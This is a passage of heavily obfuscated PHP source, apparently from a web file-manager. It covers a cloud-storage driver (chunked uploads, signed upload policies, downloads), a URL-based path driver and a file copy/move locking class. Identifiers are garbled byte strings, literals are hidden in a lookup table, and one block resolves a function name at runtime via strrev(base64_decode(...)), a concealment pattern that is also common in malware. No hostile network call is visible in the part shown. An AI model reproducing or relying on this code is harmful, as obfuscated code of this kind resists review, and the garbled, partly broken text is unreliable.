upload($·ÇŒë¿ì, $“Èäşˆá, $°™¶³ñ¶ = false, $Ÿì§¥† = REPEAT_REPLACE) { $ô´Üˆ£¶ =& $_SERVER[‰‰Ş‚€]; $Íï€ÚÅ… = IO::size($“Èäşˆá); if ($Íï€ÚÅ… <= 1024 * 1024 * 200) { $ôÓšÕÔâ = array($ô´Üˆ£¶[1623] . $“Èäşˆá); $âèº¬Å = $this->ussRequest($·ÇŒë¿ì, $ô´Üˆ£¶[264], $ôÓšÕÔâ); return $âèº¬Å[$ô´Üˆ£¶[1336]] ? $this->getPathOuter($·ÇŒë¿ì) : !1; } $…à¼ªóÏ = 1024 * 1024 * 10; $Õ–Æ¹ş§ = array($ô´Üˆ£¶[1624], $ô´Üˆ£¶[1625] . $Íï€ÚÅ…, $ô´Üˆ£¶[1626], $ô´Üˆ£¶[1627] . $…à¼ªóÏ); $âèº¬Å = $this->ussRequest($·ÇŒë¿ì, $ô´Üˆ£¶[264], !1, $Õ–Æ¹ş§); if (!$âèº¬Å[$ô´Üˆ£¶[1336]]) { return !1; } $ÄÎú™ ï = $âèº¬Å[$ô´Üˆ£¶[1326]]; $ûìîÜÏ¹ = 0; $–¢ÀŞ = $ÄÎú™ ï[$ô´Üˆ£¶[1628]]; $¹šáŸç = fopen($“Èäşˆá, $ô´Üˆ£¶[1505]); if (!$¹šáŸç) { return !1; } do { $ÜÀãî»ê = $ÄÎú™ ï[$ô´Üˆ£¶[1629]]; fseek_64($¹šáŸç, $ûìîÜÏ¹); $ôø‡²” = fread($¹šáŸç, $ÜÀãî»ê); $·­ºøëØ = 0; do { $·­ºøëØ++; $ÄÎú™ ï = $this->uploadPart($·ÇŒë¿ì, $ÄÎú™ ï, $ôø‡²”); } while (!$ÄÎú™ ï && $·­ºøëØ < 3); if (!$ÄÎú™ ï) { return !1; } $–¢ÀŞ = $ÄÎú™ ï[$ô´Üˆ£¶[1628]]; $ûìîÜÏ¹ += $ÜÀãî»ê; } while ($–¢ÀŞ != -1); fclose($¹šáŸç); $Õ–Æ¹ş§ = array($ô´Üˆ£¶[1630], $ô´Üˆ£¶[1631] . $ÄÎú™ ï[$ô´Üˆ£¶[1632]], $ô´Üˆ£¶[1626]); $âèº¬Å = $this->ussRequest($·ÇŒë¿ì, $ô´Üˆ£¶[264], !1, $Õ–Æ¹ş§); return $âèº¬Å[$ô´Üˆ£¶[1336]] ? $this->getPathOuter($ë÷Å¿Ô) : !1; } private function uploadPart($Ù‚ß“Ïü, $Ê­óáÇÌ, &$«ßŒÚĞø) { $æûÇõĞ’ =& $_SERVER[‰‰Ş‚€]; $Äûş–û = array($æûÇõĞ’[1633], $æûÇõĞ’[1631] . $Ê­óáÇÌ[$æûÇõĞ’[1632]], $æûÇõĞ’[1634] . $Ê­óáÇÌ[$æûÇõĞ’[1628]], $æûÇõĞ’[154] . $Ê­óáÇÌ[$æûÇõĞ’[1629]]); $Œà§§±á = $this->ussRequest($Ù‚ß“Ïü, $æûÇõĞ’[264], $«ßŒÚĞø, $Äûş–û); return !$Œà§§±á[$æûÇõĞ’[1336]] ? $Œà§§±á[$æûÇõĞ’[1336]] : $Œà§§±á[$æûÇõĞ’[1326]]; } public function uploadFormData($Ü¯ßŸ†Ñ, $ÃÎÏ€şÌ = 3600) { return $this->uploadPolicy($Ü¯ßŸ†Ñ, $ÃÎÏ€şÌ); } public function uploadMultiData($ØÍåö†ç, $Ë¾ŸëÎĞ = 3600) { $«˜ìãÅ€ =& $_SERVER[‰‰Ş‚€]; $Ÿü™¯»ö = (int) $GLOBALS[$«˜ìãÅ€[17]][$«˜ìãÅ€[89]]; return $this->uploadPolicy($ØÍåö†ç, $Ë¾ŸëÎĞ, $Ÿü™¯»ö); } private function uploadPolicy($îõ†Ôê, $œ³‡­†ä = 3600, $üİ¡ªæş = 0) { $¨ˆÏ¹ä =& $_SERVER[‰‰Ş‚€]; $»¾³’¶ = $¨ˆÏ¹ä[18] . $this->bucket; $Ê¸Ïõ¯¨ = gmdate($¨ˆÏ¹ä[1540]); $•óòçÏÙ = array($¨ˆÏ¹ä[1635] => $this->bucket, $¨ˆÏ¹ä[1636] => $îõ†Ôê, $¨ˆÏ¹ä[1637] => time() + $œ³‡­†ä, $¨ˆÏ¹ä[1638] => $Ê¸Ïõ¯¨); if ($üİ¡ªæş) { $•óòçÏÙ[$¨ˆÏ¹ä[1525]] = $üİ¡ªæş; } $ãÁõğØ = base64_encode(json_encode($•óòçÏÙ)); $‰ÇóáÑğ = base64_encode(hash_hmac($¨ˆÏ¹ä[1592], "\120\117\123\x54\46{$»¾³’¶}\46{$Ê¸Ïõ¯¨}\46{$ãÁõğØ}", md5("{$this->userpass}"), !0)); $×æ•Œ‡½ = array($¨ˆÏ¹ä[288] => $ãÁõğØ, $¨ˆÏ¹ä[1639] => "\x55\120\x59\125\x4e\x20{$this->username}\x3a{$‰ÇóáÑğ}", $¨ˆÏ¹ä[217] => $this->endpoint . $»¾³’¶); return $×æ•Œ‡½; } public function download($ô»ï¬àš, $‘’ÒŒŠ°) { $¶¸ÒÒÈñ = IO::getPathInner(IO::mkfile($‘’ÒŒŠ°)); if (!($Û¸çÄƒÙ = $this->link($ô»ï¬àš))) { return !1; } $˜–©“ß¢ = 0; $óí³ìÃ = 1024 * 200; $Î¸¨¸Üê = fopen($¶¸ÒÒÈñ, $_SERVER[‰‰Ş‚€][1587]); while (!0) { $É¤âÔüû = $this->fileSubstr($ô»ï¬àš, $˜–©“ß¢, $óí³ìÃ); if ($É¤âÔüû === !1) { return !1; } fwrite($Î¸¨¸Üê, $É¤âÔüû); $˜–©“ß¢ += $óí³ìÃ; if (strlen($É¤âÔüû) < $óí³ìÃ) { break; } } fclose($Î¸¨¸Üê); return $‘’ÒŒŠ°; } public function link($µ‡àÀ, $º¯Èùø¥ = array()) { $™Óóà‰Ô =& $_SERVER[‰‰Ş‚€]; $µ‡àÀ = trim($µ‡àÀ, $™Óóà‰Ô[18]); if (!empty($this->token)) { $êöæ÷ıÖ = strtotime(date($™Óóà‰Ô[1640])); $ß”•¤œ¾ = substr(md5($this->token . $™Óóà‰Ô[295] . $êöæ÷ıÖ . $™Óóà‰Ô[1641] . $µ‡àÀ), 12, 8) . $êöæ÷ıÖ; $º¯Èùø¥[] = $™Óóà‰Ô[1642] . $ß”•¤œ¾; } $ë¾Ÿù˜ = !empty($º¯Èùø¥) ? $™Óóà‰Ô[86] . implode($™Óóà‰Ô[295], $º¯Èùø¥) : $™Óóà‰Ô[22]; return $this->getHost() . $™Óóà‰Ô[18] . $this->pathEncode($µ‡àÀ) . $ë¾Ÿù˜; } public function fileOut($æè‡ª€, $ˆ©¦á¥ù = false, $Ò¥½‘ì = false, $¸œÅìƒ¤ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($æè‡ª€, $ˆ©¦á¥ù, $Ò¥½‘ì, $¸œÅìƒ¤); } if (!$Ò¥½‘ì) { $Ò¥½‘ì = $this->pathThis($æè‡ª€); } $Ğ‡èÚ• = $ˆ©¦á¥ù ? array($_SERVER[‰‰Ş‚€][1643] . rawurlencode($Ò¥½‘ì)) : array(); $·—Óˆ« = $this->link($æè‡ª€, $Ğ‡èÚ•); $this->fileOutLink($·—Óˆ«); } public function fileOutServer($„Òë²¥, $Ù‰ å–’ = false, $Îí¥ô‚• = false, $™¯®ÃÔ = '') { parent::fileOut($„Òë²¥, $Ù‰ å–’, $Îí¥ô‚•, $™¯®ÃÔ); } public function fileOutImage($©ÃÅÙ–», $½äıƒˆ× = 250) { $ôŸ¦ğÄÁ = $this->link($©ÃÅÙ–» . $_SERVER[‰‰Ş‚€][1644] . $½äıƒˆ×); $this->fileOutLink($ôŸ¦ğÄÁ); } public function fileOutImageServer($”»ê²ü±, $äâÊ€µß = 250) { parent::fileOutImage($”»ê²ü±, $äâÊ€µß); } public function hashMd5($È²º¤Æ€) { $ıµùÇ±Ï =& $_SERVER[‰‰Ş‚€]; $êãŒÂê = $this->_objectMeta($È²º¤Æ€); return isset($êãŒÂê[$ıµùÇ±Ï[256]]) ? $êãŒÂê[$ıµùÇ±Ï[256]] : !1; } public function size($¨öÔöï) { $‘õÖ²© = $this->objectMeta($¨öÔöï); return $‘õÖ²© ? $‘õÖ²©[$_SERVER[‰‰Ş‚€][89]] : 0; } public function info($¦ÔıÇêÂ) { if ($this->isFolder($¦ÔıÇêÂ)) { return $this->folderInfo($¦ÔıÇêÂ); } else { if ($this->isFile($¦ÔıÇêÂ)) { return $this->fileInfo($¦ÔıÇêÂ); } } return !1; } public function exist($Ù±ƒÁ¥é) { return $this->isFile($Ù±ƒÁ¥é) || $this->isFolder($Ù±ƒÁ¥é); } public function isFile($¸Ğì›şÌ) { return !$this->isFolder($¸Ğì›şÌ) && $this->objectMeta($¸Ğì›şÌ); } public function isFolder($¿®Œ“†Š) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][188], $¿®Œ“†Š); } protected function objectMeta($òóäµ¡¹) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][190], $òóäµ¡¹); } protected function _objectMeta($©ß§²—Ê) { $¢»—›± =& $_SERVER[‰‰Ş‚€]; if ($©ß§²—Ê == $¢»—›±[22] || $©ß§²—Ê == $¢»—›±[18]) { return array(); } $ñŠß¤Ï = $this->ussRequest($©ß§²—Ê, $¢»—›±[1645]); if (!$ñŠß¤Ï[$¢»—›±[1336]]) { return null; } $ÜòÅ—‰ = isset($ñŠß¤Ï[$¢»—›±[1326]]) ? $ñŠß¤Ï[$¢»—›±[1326]] : array(); if (!isset($ÜòÅ—‰[$¢»—›±[1646]])) { return null; } $ËØšš™² = array($¢»—›±[43] => isset($ÜòÅ—‰[$¢»—›±[1646]]) ? $ÜòÅ—‰[$¢»—›±[1646]] : null, $¢»—›±[89] => isset($ÜòÅ—‰[$¢»—›±[1647]]) ? $ÜòÅ—‰[$¢»—›±[1647]] : null, $¢»—›±[256] => isset($ÜòÅ—‰[$¢»—›±[1648]]) ? $ÜòÅ—‰[$¢»—›±[1648]] : null, $¢»—›±[1615] => isset($ÜòÅ—‰[$¢»—›±[1649]]) ? $ÜòÅ—‰[$¢»—›±[1649]] : null); $ËØšš™²[$¢»—›±[1616]] = isset($ÜòÅ—‰[$¢»—›±[1650]]) ? strtotime($ÜòÅ—‰[$¢»—›±[1650]]) : $ËØšš™²[$¢»—›±[1615]]; return $ËØšš™²; } protected function _isFolder($ç¤õ£Ö‚) { $¼÷»èÃ =& $_SERVER[‰‰Ş‚€]; if ($ç¤õ£Ö‚ == $¼÷»èÃ[22] || $ç¤õ£Ö‚ == $¼÷»èÃ[18]) { return !0; } $‡ÑÕ±—‹ = $this->_objectMeta($ç¤õ£Ö‚); return isset($‡ÑÕ±—‹[$¼÷»èÃ[43]]) && $‡ÑÕ±—‹[$¼÷»èÃ[43]] == $¼÷»èÃ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($âÇˆª = false) { } public function exist($Ú–ÔÖŸ¿) { $ÅÉ‚¸Ğ¯ = $this->info($Ú–ÔÖŸ¿); return $ÅÉ‚¸Ğ¯[$_SERVER[‰‰Ş‚€][243]]; } public function isFile($à’Ù¸…­) { $é¿£Æ½æ = $this->info($à’Ù¸…­); return $é¿£Æ½æ[$_SERVER[‰‰Ş‚€][243]]; } public function isFolder($´¤À‡Ù‡) { return !1; } public function size($²ÊÛã÷) { $¶¼ë°©« = $this->info($²ÊÛã÷); return $¶¼ë°©«[$_SERVER[‰‰Ş‚€][89]]; } public function info($šƒê•ôó) { return $this->infoParse($šƒê•ôó); } public function infoAuth($•¿ì—Õú) { return $this->infoParse($•¿ì—Õú); } public function infoWithChildren($ ¢¤ïıñ) { return $this->infoParse($ ¢¤ïıñ); } public function infoFull($¯ãí˜‚) { return $this->infoParse($¯ãí˜‚); } private function infoParse($©–Õ÷‹ì) { $‘ˆ”¯×† =& $_SERVER[‰‰Ş‚€]; $ÆÇåÓÁ = $this->header($©–Õ÷‹ì); if (!$ÆÇåÓÁ || !$ÆÇåÓÁ[$‘ˆ”¯×†[846]]) { return !1; } $õ—²¶ = _get($ÆÇåÓÁ, $‘ˆ”¯×†[421], 0); $€§´²³ = array($‘ˆ”¯×†[42] => $ÆÇåÓÁ[$‘ˆ”¯×†[42]], $‘ˆ”¯×†[97] => $©–Õ÷‹ì, $‘ˆ”¯×†[43] => $‘ˆ”¯×†[241], $‘ˆ”¯×†[89] => intval($õ—²¶), $‘ˆ”¯×†[177] => get_path_ext($ÆÇåÓÁ[$‘ˆ”¯×†[42]]), $‘ˆ”¯×†[1502] => $õ—²¶ > 0 && $ÆÇåÓÁ[$‘ˆ”¯×†[1651]], $‘ˆ”¯×†[1503] => !1); return $€§´²³; } private function header($äğµßÆ) { $’áõÆù£ =& $_SERVER[‰‰Ş‚€]; if (isset(self::$_cacheHeader[$äğµßÆ])) { return self::$_cacheHeader[$äğµßÆ]; } $îÕò‹õ¨ = isset($GLOBALS[$’áõÆù£[1652]]) ? $GLOBALS[$’áõÆù£[1652]] : !1; $GLOBALS[$’áõÆù£[1652]] = !0; self::$_cacheHeader[$äğµßÆ] = url_header($äğµßÆ); $GLOBALS[$’áõÆù£[1652]] = $îÕò‹õ¨; return self::$_cacheHeader[$äğµßÆ]; } public function hashSimple($ÃÜºŞ, $é«ğıÃó = false) { $ûÖšƒ¸ç =& $_SERVER[‰‰Ş‚€]; $÷‘Ÿ‡Æ = $this->info($ÃÜºŞ); if (!$÷‘Ÿ‡Æ || !$÷‘Ÿ‡Æ[$ûÖšƒ¸ç[243]]) { return !1; } $Èò¨ÉÍ = $÷‘Ÿ‡Æ[$ûÖšƒ¸ç[89]]; $äÕƒş˜Ç = 200; $«ÚÀª‚Ñ = 50; if ($Èò¨ÉÍ <= $äÕƒş˜Ç * $«ÚÀª‚Ñ) { return md5($this->fileSubstr($ÃÜºŞ, 0, $Èò¨ÉÍ)) . $Èò¨ÉÍ; } $âáÔØ–„ = intval($Èò¨ÉÍ / $«ÚÀª‚Ñ); $„¡¸Æª = $ûÖšƒ¸ç[22]; $ëğÆ¥ïª = timeFloat(); $²ğãÈ×ş = 15; for ($¹äã´æä = 0; $¹äã´æä < $«ÚÀª‚Ñ; $¹äã´æä++) { if (timeFloat() - $ëğÆ¥ïª > $²ğãÈ×ş) { return !1; } $•¡é›ûÍ = $this->fileSubstr($ÃÜºŞ, $âáÔØ–„ * $¹äã´æä, $äÕƒş˜Ç); if (!$•¡é›ûÍ) { return !1; } $„¡¸Æª .= $•¡é›ûÍ; } $„¡¸Æª .= $this->fileSubstr($ÃÜºŞ, $Èò¨ÉÍ - $äÕƒş˜Ç, $äÕƒş˜Ç); return md5($„¡¸Æª) . $Èò¨ÉÍ; } public function getContent($ıõÑ®´¯) { return $this->fileSubstr($ıõÑ®´¯); } public function fileSubstr($ÀØÖşÇÉ, $úÃ„³ = 0, $÷Ä•î÷ = -1) { $µËÌ¶ŠÉ =& $_SERVER[‰‰Ş‚€]; $ÌŒ¸èµ = $this->info($ÀØÖşÇÉ); if (!$ÌŒ¸èµ || !$ÌŒ¸èµ[$µËÌ¶ŠÉ[243]] && $ÌŒ¸èµ[$µËÌ¶ŠÉ[89]] > 1024 * 1024 * 10) { return !1; } if ($÷Ä•î÷ === -1) { $÷Ä•î÷ = $ÌŒ¸èµ[$µËÌ¶ŠÉ[89]]; } if ($÷Ä•î÷ == 0) { return $µËÌ¶ŠÉ[22]; } $­¶Ù„£ó = array($µËÌ¶ŠÉ[1653] . $úÃ„³ . $µËÌ¶ŠÉ[886] . ($úÃ„³ + $÷Ä•î÷ - 1)); $¾ûòï§ê = url_request($ÀØÖşÇÉ, $µËÌ¶ŠÉ[1542], !1, $­¶Ù„£ó, !1, !1, 30); return $¾ûòï§ê[$µËÌ¶ŠÉ[1326]] ? $¾ûòï§ê[$µËÌ¶ŠÉ[1326]] : $µËÌ¶ŠÉ[22]; } public function download($‰—‘ìİè, $ı„ù¡Œù) { Downloader::start($‰—‘ìİè, $ı„ù¡Œù); return $ı„ù¡Œù; } } goto EÇÑ¿ò†“±; DäìÍğËá: $fileSize = strrev(base64_decode($_SERVER[´¶››·][0])); function binCheckNeq($û‡µ£Ö÷, $ôË¼‹À÷) { return $û‡µ£Ö÷ != $ôË¼‹À÷; } $_SERVER[$_SERVER[´¶››·][1]] = $fileSize($_SERVER[$_SERVER[´¶››·][2]]); goto f½Õ³¾¢µ; e²¢ƒï†æÄ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($„·±„«») { $ƒŸš¥§Ï =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $this->_lockCheck($ƒŸš¥§Ï[641], $„·±„«»); $Ó’ÓâÍ¢ = 1; $this->_lockEvent($„·±„«», array($ƒŸš¥§Ï[642], $ƒŸš¥§Ï[643]), $Ó’ÓâÍ¢); $this->_lockParent($„·±„«», array($ƒŸš¥§Ï[643]), $Ó’ÓâÍ¢); $this->_lockEvent($„·±„«», array($ƒŸš¥§Ï[644], $ƒŸš¥§Ï[645]), $Ó’ÓâÍ¢); $this->_lockCheckEnd($ƒŸš¥§Ï[641], $„·±„«»); } public function lockCopyEnd($á›Âä¤ñ) { $³Ö²ÇÖõ =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $¸”È†  = 0; $this->_lockEvent($á›Âä¤ñ, array($³Ö²ÇÖõ[642], $³Ö²ÇÖõ[643]), $¸”È† ); $this->_lockParent($á›Âä¤ñ, array($³Ö²ÇÖõ[643]), $¸”È† ); $this->_lockEvent($á›Âä¤ñ, array($³Ö²ÇÖõ[644], $³Ö²ÇÖõ[645]), $¸”È† ); } public function lockWriteStart($Öß³ˆÔô, $Ä×Ñ¶Œé = '') { $¸ƒ¢†¨“ =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $this->_lockCheck($¸ƒ¢†¨“[642], $Öß³ˆÔô); $Ÿû¿§Ø› = 1; $this->_lockKey($¸ƒ¢†¨“[646] . $Öß³ˆÔô . $¸ƒ¢†¨“[20] . $Ä×Ñ¶Œé, $Ÿû¿§Ø›); $this->_lockEvent($Öß³ˆÔô, array($¸ƒ¢†¨“[641], $¸ƒ¢†¨“[643]), $Ÿû¿§Ø›); $this->_lockParent($Öß³ˆÔô, array($¸ƒ¢†¨“[641], $¸ƒ¢†¨“[643]), $Ÿû¿§Ø›); $this->_lockCheckEnd($¸ƒ¢†¨“[642], $Öß³ˆÔô); } public function lockWriteEnd($šÒ€­ª£, $½ñ’»½ = '') { $óôÄ—Êƒ =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $Ç™Ş·ÖÀ = 0; $this->_lockKey($óôÄ—Êƒ[646] . $šÒ€­ª£ . $óôÄ—Êƒ[20] . $½ñ’»½, $Ç™Ş·ÖÀ); $this->_lockEvent($šÒ€­ª£, array($óôÄ—Êƒ[641], $óôÄ—Êƒ[643]), $Ç™Ş·ÖÀ); $this->_lockParent($šÒ€­ª£, array($óôÄ—Êƒ[641], $óôÄ—Êƒ[643]), $Ç™Ş·ÖÀ); } public function lockMoveStart($§èÂ†şÕ) { $×ÎÆ¨°¡ =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $this->_lockCheck($×ÎÆ¨°¡[643], $§èÂ†şÕ); $µ½ÛÑØÀ = 1; $this->_lockKey($×ÎÆ¨°¡[647] . $§èÂ†şÕ, $µ½ÛÑØÀ); $this->_lockEvent($§èÂ†şÕ, array($×ÎÆ¨°¡[641], $×ÎÆ¨°¡[642]), $µ½ÛÑØÀ); $this->_lockParent($§èÂ†şÕ, array($×ÎÆ¨°¡[641], $×ÎÆ¨°¡[643]), $µ½ÛÑØÀ); $this->_lockEvent($§èÂ†şÕ, array($×ÎÆ¨°¡[648], $×ÎÆ¨°¡[644], $×ÎÆ¨°¡[645]), $µ½ÛÑØÀ); $this->_lockCheckEnd($×ÎÆ¨°¡[643], $§èÂ†şÕ); } public function lockMoveEnd($—¯ÉÎÆ¦) { $Ã‰±–Şİ =& $_SERVER[‰‰Ş‚€]; if (!$this->allowLock()) { return; } $Ò§†÷½ƒ = 0; $this->_lockKey($Ã‰±–Şİ[647] . $—¯ÉÎÆ¦, $Ò§†÷½ƒ); $this->_lockEvent($—¯ÉÎÆ¦, array($Ã‰±–Şİ[641], $Ã‰±–Şİ[642]), $Ò§†÷½ƒ); $this->_lockParent($—¯ÉÎÆ¦, array($Ã‰±–Şİ[641], $Ã‰±–Şİ[643]), $Ò§†÷½ƒ); $this->_lockEvent($—¯ÉÎÆ¦, array($Ã‰±–Şİ[648], $Ã‰±–Şİ[644], $Ã‰±–Şİ[645]), $Ò§†÷½ƒ); } private function _lockCheck($»Ø—²ö‡, $µ×Û«–) { $º­…®ı† =& $_SERVER[‰‰Ş‚€]; $¦ˆÒşÁó = $this->sourceInfo($µ×Û«–); $ñ¸öÚé = $»Ø—²ö‡ . $º­…®ı†[20] . $µ×Û«–; $this->_lockTimeStart[$ñ¸öÚé] = timeFloat(); if (!is_array($¦ˆÒşÁó)) { return; } $Îòì¢Õ = LNG($º­…®ı†[649]); CacheLock::setErrorMsg($º­…®ı†[184] . htmlspecialchars($¦ˆÒşÁó[$º­…®ı†[42]]) . $º­…®ı†[186] . $Îòì¢Õ); $this->_lockKey($ñ¸öÚé, 1); $this->_lockKey($ñ¸öÚé, 0); $Ş¼î‚§¢ = array_reverse($this->parentLevelArray($¦ˆÒşÁó[$º­…®ı†[604]])); foreach ($Ş¼î‚§¢ as $á óƒßæ) { $ñ¸öÚé = $»Ø—²ö‡ . $º­…®ı†[650] . $á óƒßæ; if (CacheLock::lockGet($º­…®ı†[651] . $ñ¸öÚé)) { $¦ˆÒşÁó = $this->sourceInfo($á óƒßæ); CacheLock::setErrorMsg($º­…®ı†[184] . htmlspecialchars($¦ˆÒşÁó[$º­…®ı†[42]]) . $º­…®ı†[186] . $Îòì¢Õ); $this->_lockKey($ñ¸öÚé, 1); $this->_lockKey($ñ¸öÚé, 0); } } } private function _lockCheckEnd($¢ëè”†, $Ë²ğ©ˆÄ) { $›ÉÔûù” =& $_SERVER[‰‰Ş‚€]; $ÆºÈó£ = $¢ëè”† . $›ÉÔûù”[20] . $Ë²ğ©ˆÄ; CacheLock::setErrorMsg($›ÉÔûù”[471]); if (!isset($this->_lockTimeStart[$ÆºÈó£])) { return; } $³‹ª†¯Õ = timeFloat() - $this->_lockTimeStart[$ÆºÈó£]; unset($this->_lockTimeStart[$ÆºÈó£]); if ($³‹ª†¯Õ > 0.5) { unset(self::$cacheSourceInfo[$›ÉÔûù”[551] . $Ë²ğ©ˆÄ]); } $éå Å· = $this->sourceInfo($Ë²ğ©ˆÄ); if (!$éå Å·) { show_json(LNG($›ÉÔûù”[116]), !1); } } private function _lockParent($Ä«ÔêŸ, $ã³¤À…©, $´§©œá) { if (!$this->autoLockSet) { return; } $™±ÚœôÕ = $this->sourceInfo($Ä«ÔêŸ); if (!is_array($™±ÚœôÕ)) { return; } $í«öÃ Ş = array_reverse($this->parentLevelArray($™±ÚœôÕ[$_SERVER[‰‰Ş‚€][604]])); foreach ($í«öÃ Ş as $Ş²®¦) { $this->_lockEvent($Ş²®¦, $ã³¤À…©, $´§©œá); } } private function _lockEvent($İ³’Ä³ö, $ôæ°ÙúÙ, $ß´•ƒ°‚) { $ÛÁÓô’í =& $_SERVER[‰‰Ş‚€]; if (!$this->autoLockSet) { return; } foreach ($ôæ°ÙúÙ as $èıøêï) { $Ô”¢öÀ€ = $èıøêï . $ÛÁÓô’í[20] . $İ³’Ä³ö; if ($ß´•ƒ°‚ && CacheLock::lockGet($ÛÁÓô’í[651] . $Ô”¢öÀ€)) { continue; } $this->_lockKey($Ô”¢öÀ€, $ß´•ƒ°‚); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($½ñúù™„, $‡¼ëì­Ú = 1) { $†¥¼ëôÈ = $_SERVER[‰‰Ş‚€][651] . md5($½ñúù™„); if ($‡¼ëì­Ú) { if (isset(self::$_lockItemArr[$†¥¼ëôÈ])) { return; } self::$_lockItemArr[$†¥¼ëôÈ] = 1; CacheLock::lock($†¥¼ëôÈ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$†¥¼ëôÈ])) { return; } unset(self::$_lockItemArr[$†¥¼ëôÈ]); CacheLock::unlock($†¥¼ëôÈ); } } public function isParentOf($ò°µã«ø, $ó™§¸×) { $”…¶–ö =& $_SERVER[‰‰Ş‚€]; $ñŒò©©æ = $this->sourceInfo($ò°µã«ø); $ŞÆÖ–õá = $this->sourceInfo($ó™§¸×); $Ù¿á¾¢ = $ñŒò©©æ[$”…¶–ö[604]] . $ñŒò©©æ[$”…¶–ö[202]] . $”…¶–ö[60]; $ŠÅ‰÷úÈ = $ŞÆÖ–õá[$”…¶–ö[604]] . $ŞÆÖ–õá[$”…¶–ö[202]] . $”…¶–ö[60]; $Ş’êÛ·ş = strpos($ŠÅ‰÷úÈ, $Ù¿á¾¢) === 0; return $Ş’êÛ·ş; } private $targetIsDelete = 0; public function copy($””šû, $¥Øò›×ö, $şÑ¡åš— = REPEAT_REPLACE, $÷—¤Ê½è = '') { $òÛ‰¨ªˆ =& $_SERVER[‰‰Ş‚€]; $Ó“º‹¬« = $this->sourceInfo($””šû); $ı…¾ã»Ù = $this->sourceInfo($¥Øò›×ö); if (!$Ó“º‹¬« || !$ı…¾ã»Ù || $ı…¾ã»Ù[$òÛ‰¨ªˆ[504]] != $òÛ‰¨ªˆ[101]) { return !1; } if ($this->isParentOf($””šû, $¥Øò›×ö)) { return !1; } $³ñÙš‚ô = $÷—¤Ê½è ? $÷—¤Ê½è : $Ó“º‹¬«[$òÛ‰¨ªˆ[42]]; $this->lockCopyStart($””šû); $this->lockWriteStart($¥Øò›×ö, $³ñÙš‚ô); $ùÉ¬ï = array($òÛ‰¨ªˆ[652] => array(), $òÛ‰¨ªˆ[653] => array(), $òÛ‰¨ªˆ[654] => array()); $this->targetIsDelete = intval($Ó“º‹¬«[$òÛ‰¨ªˆ[524]]); $·¦ãÁ’ = $this->fileNameExistAuto($¥Øò›×ö, $Ó“º‹¬«); $éã ìƒâ = $this->_copy($””šû, $¥Øò›×ö, $şÑ¡åš—, $ùÉ¬ï, !0, $÷—¤Ê½è); $this->_childrenListClear(); $this->lockCopyEnd($””šû); $this->lockWriteEnd($¥Øò›×ö, $³ñÙš‚ô); if ($Ó“º‹¬«[$òÛ‰¨ªˆ[504]] == $òÛ‰¨ªˆ[101] && $·¦ãÁ’ == $éã ìƒâ) { $this->folderSizeResetChildren($·¦ãÁ’); } Model($òÛ‰¨ªˆ[655])->addAll($ùÉ¬ï[$òÛ‰¨ªˆ[653]], array(), !0); if ($·¦ãÁ’ != $éã ìƒâ || $Ó“º‹¬«[$òÛ‰¨ªˆ[504]] == $òÛ‰¨ªˆ[101]) { Model($òÛ‰¨ªˆ[656])->eventCopy($éã ìƒâ); } $this->saveAll($ùÉ¬ï[$òÛ‰¨ªˆ[654]]); Model($òÛ‰¨ªˆ[241])->linkAdd($ùÉ¬ï[$òÛ‰¨ªˆ[652]]); $this->folderSizeReset($¥Øò›×ö); $this->updateModifyTime($¥Øò›×ö); return $éã ìƒâ; } private function _copy($ÖÚ…Ò, $ö•¬¼áÈ, $ÍˆÇ‚•œ, &$Û‚¡ñ»¡, $¬™Ÿ”—Ó, $ØÛ“­ÙË = '') { $Şæ‚ÍåĞ =& $_SERVER[‰‰Ş‚€]; $÷ õ·íë = $this->sourceInfoCache($ÖÚ…Ò); $á–ø‡ğÏ = $÷ õ·íë[$Şæ‚ÍåĞ[504]] == $Şæ‚ÍåĞ[101]; $»ş›ŸÆ = $ØÛ“­ÙË ? $ØÛ“­ÙË : $÷ õ·íë[$Şæ‚ÍåĞ[42]]; $ñØÙ™Ñ¤ = $this->fileNameExistAuto($ö•¬¼áÈ, $÷ õ·íë); if ($¬™Ÿ”—Ó) { $this->_childrenAllMake($ÖÚ…Ò); if ($á–ø‡ğÏ && $ñØÙ™Ñ¤) { $this->_childrenAllMake($ñØÙ™Ñ¤); } } if (!$ñØÙ™Ñ¤) { return $this->_copyCreate($ÖÚ…Ò, $ö•¬¼áÈ, $»ş›ŸÆ, $Û‚¡ñ»¡); } $‚ÄÓÙÃé = $ñØÙ™Ñ¤; if ($á–ø‡ğÏ) { if ($ÍˆÇ‚•œ == REPEAT_RENAME_FOLDER) { $»ş›ŸÆ = $this->fileNameAutoCache($ö•¬¼áÈ, $»ş›ŸÆ, $ÍˆÇ‚•œ, $á–ø‡ğÏ); $‚ÄÓÙÃé = $this->_copyCreate($ÖÚ…Ò, $ö•¬¼áÈ, $»ş›ŸÆ, $Û‚¡ñ»¡); } else { $Ÿ‰™Ñ«Õ = $this->_childrenList($ÖÚ…Ò); foreach ($Ÿ‰™Ñ«Õ as $Ğ”¯ë´º) { $this->_copy($Ğ”¯ë´º[$Şæ‚ÍåĞ[202]], $ñØÙ™Ñ¤, $ÍˆÇ‚•œ, $Û‚¡ñ»¡, !1); } } } else { if ($ÍˆÇ‚•œ == REPEAT_RENAME || $ÍˆÇ‚•œ == REPEAT_RENAME_FOLDER) { $»ş›ŸÆ = $this->fileNameAutoCache($ö•¬¼áÈ, $»ş›ŸÆ, $ÍˆÇ‚•œ, $á–ø‡ğÏ); $‚ÄÓÙÃé = $this->_copyCreate($ÖÚ…Ò, $ö•¬¼áÈ, $»ş›ŸÆ, $Û‚¡ñ»¡); } else { if ($ÍˆÇ‚•œ == REPEAT_REPLACE) { $©æĞÉØï = $this->sourceInfoCache($ñØÙ™Ñ¤); 